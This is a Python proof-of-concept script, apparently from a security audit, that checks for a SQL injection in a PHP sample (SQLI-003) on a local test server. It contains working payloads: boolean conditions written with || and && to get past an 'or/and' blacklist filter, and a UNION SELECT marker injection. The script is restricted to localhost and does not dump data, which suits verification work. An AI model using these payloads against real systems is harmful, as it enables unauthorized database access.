#!/usr/bin/env python3
#
# SQLI-003 / final-wp4-v1 local verification draft (marker only, non-destructive).
# Sink: normalized_samples/SQLI-003.php lines 171,177,180,181,186,188,194,208.
# Filter: blacklist() removes substrings or/and (case-insensitive) only.
# The audited file request path is not in the audit input: --path is mandatory.
# --columns and --marker-pos must be adapted to the deployed users table.
# Only GET parameter id is used. No enumeration, dumping or writes.
import argparse
import json
import sys
import urllib.error
import urllib.parse
import urllib.request

LOCAL_HOSTS = ('localhost', '127.0.0.1', '::1')
LOGIN_LABEL = 'Your Login name:'
PASS_LABEL = 'Your Password:'
HINT_LABEL = 'Hint: Your Input is Filtered with following result:'
PHP_ERRORS = ('Fatal error', 'Parse error', 'Warning:', 'mysql_query', 'mysqli_query')
BANNED = ('or', 'and')
TRUE_COND = "-1'||'1'='1"
FALSE_COND = "-1'&&'1'='2"
UNION_FMT = "-1' UNION SELECT "
UNION_TAIL = '-- -'


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def check_host(base_url):
    p = urllib.parse.urlparse(base_url)
    if p.scheme not in ('http', 'https'):
        sys.exit('[ABORT] --base-url must start with http:// or https://')
    if not p.hostname or p.hostname.lower() not in LOCAL_HOSTS:
        sys.exit('[ABORT] only localhost/127.0.0.1/::1 targets are allowed')


def read_cookie(path):
    if not path:
        return None
    pairs = []
    with open(path, 'r', encoding='utf-8') as fh:
        for line in fh:
            line = line.strip()
            if line and not line.startswith('#'):
                pairs.append(line)
    return '; '.join(pairs) if pairs else None


def fetch(base_url, path, param, value, cookie, timeout):
    url = base_url.rstrip('/') + path + '?' + urllib.parse.urlencode({param: value})
    req = urllib.request.Request(url, method='GET')
    req.add_header('User-Agent', 'sqli003-wp4-draft/1.0')
    if cookie:
        req.add_header('Cookie', cookie)  # never printed
    opener = urllib.request.build_opener(NoRedirect)
    try:
        with opener.open(req, timeout=timeout) as resp:
            body = resp.read().decode('utf-8', 'replace')
            return {'status': getattr(resp, 'status', resp.getcode()),
                    'location': None, 'body': body, 'transport_error': None}
    except urllib.error.HTTPError as exc:
        body = exc.read().decode('utf-8', 'replace') if exc.fp else ''
        return {'status': exc.code, 'location': exc.headers.get('Location'),
                'body': body, 'transport_error': None}
    except Exception as exc:
        return {'status': None, 'location': None, 'body': '',
                'transport_error': type(exc).__name__ + ': ' + str(exc)[:200]}


def field(body, label):
    i = body.find(label)
    if i < 0:
        return None
    rest = body[i + len(label):]
    j = rest.find('<')
    if j >= 0:
        rest = rest[:j]
    return rest.strip()


def union_payload(columns, marker, marker_pos):
    parts = []
    for i in range(1, columns + 1):
        parts.append("'" + marker + "'" if i == marker_pos else str(i))
    return UNION_FMT + ','.join(parts) + UNION_TAIL


def main():
    ap = argparse.ArgumentParser(description='SQLI-003 local marker draft')
    ap.add_argument('--base-url', required=True, help='e.g. http://127.0.0.1:8080')
    ap.add_argument('--path', required=True, help='request path of the audited file (not given in audit input)')
    ap.add_argument('--param', default='id', help='GET parameter from code: id')
    ap.add_argument('--session-file', default=None, help='optional file with name=value Cookie lines')
    ap.add_argument('--timeout', type=float, default=10.0)
    ap.add_argument('--columns', type=int, default=3, help='users table SELECT column count; adapt')
    ap.add_argument('--marker', default='POCMARKERSQLI003', help='synthetic marker; must not contain or/and')
    ap.add_argument('--marker-pos', type=int, default=2, help='column position rendered as username')
    ap.add_argument('--json-out', default=None)
    args = ap.parse_args()

    check_host(args.base_url)
    if any(b in args.marker.lower() for b in BANNED):
        sys.exit('[ABORT] marker contains a substring blacklist() removes')
    if args.columns < 1 or not 1 <= args.marker_pos <= args.columns:
        sys.exit('[ABORT] invalid --columns / --marker-pos')

    cookie = read_cookie(args.session_file)
    union = union_payload(args.columns, args.marker, args.marker_pos)
    cases = [
        ('baseline_present', '1', 'existing numeric id: normal row'),
        ('baseline_absent', '-1', 'non-existent numeric id: empty'),
        ('true_condition', TRUE_COND, 'boolean TRUE on absent id: row only if semantics changed'),
        ('false_condition', FALSE_COND, 'boolean FALSE: must stay empty'),
        ('union_marker', union, 'UNION marker must appear in parsed Login name'),
    ]

    results = {}
    for name, value, why in cases:
        if any(b in value.lower() for b in BANNED):
            sys.exit('[ABORT] case ' + name + ' contains a blacklist() token')
        r = fetch(args.base_url, args.path, args.param, value, cookie, args.timeout)
        r['case'] = name
        r['payload'] = value
        r['why'] = why
        r['login'] = field(r['body'], LOGIN_LABEL) if r['body'] else None
        r['password'] = field(r['body'], PASS_LABEL) if r['body'] else None
        r['hint'] = field(r['body'], HINT_LABEL) if r['body'] else None
        r['php_error'] = any(t in r['body'] for t in PHP_ERRORS)
        results[name] = r
        print('[%s] status=%s location=%s login=%r password=%r hint=%r php_error=%s transport_error=%s' % (
            name, r['status'], r['location'], r['login'], r['password'], r['hint'],
            r['php_error'], r['transport_error']))

    if any(r['transport_error'] for r in results.values()):
        print('[STOP] transport failure: no vulnerability conclusion')
        return 3
    if any(r['php_error'] for r in results.values()):
        print('[STOP] PHP/MySQL interface error in response: environment issue, not a filter')
        return 2

    base = results['baseline_present']
    absent = results['baseline_absent']
    true_c = results['true_condition']
    false_c = results['false_condition']
    mark = results['union_marker']

    checks = [
        ('normal_row_visible', base['login'] not in (None, ''), 'baseline id=1 login=' + repr(base['login'])),
        ('absent_row_empty', absent['login'] in (None, ''), 'baseline id=-1 login=' + repr(absent['login'])),
        ('no_redirect', all(r['location'] is None for r in results.values()), 'no 3xx Location'),
        ('true_condition_row', true_c['login'] not in (None, ''), 'true condition login=' + repr(true_c['login'])),
        ('false_condition_empty', false_c['login'] in (None, ''), 'false condition login=' + repr(false_c['login'])),
        ('union_marker_in_username', mark['login'] == args.marker, 'union login=' + repr(mark['login'])),
        ('filter_did_not_rewrite', mark['hint'] == union, 'hint=' + repr(mark['hint'])),
    ]
    ok = dict((c[0], c[1]) for c in checks)
    for name, passed, detail in checks:
        print('[CRITERION] %s: %s <- %s' % (name, 'PASS' if passed else 'FAIL', detail))

    primary = all(ok.values())
    print('[SUMMARY] injectable id parameter observed in this local run: %s' % primary)
    if args.json_out:
        with open(args.json_out, 'w', encoding='utf-8') as fh:
            json.dump({'cases': results, 'criteria': ok, 'primary': primary}, fh, ensure_ascii=False, indent=2)
    return 0


if __name__ == '__main__':
    sys.exit(main())
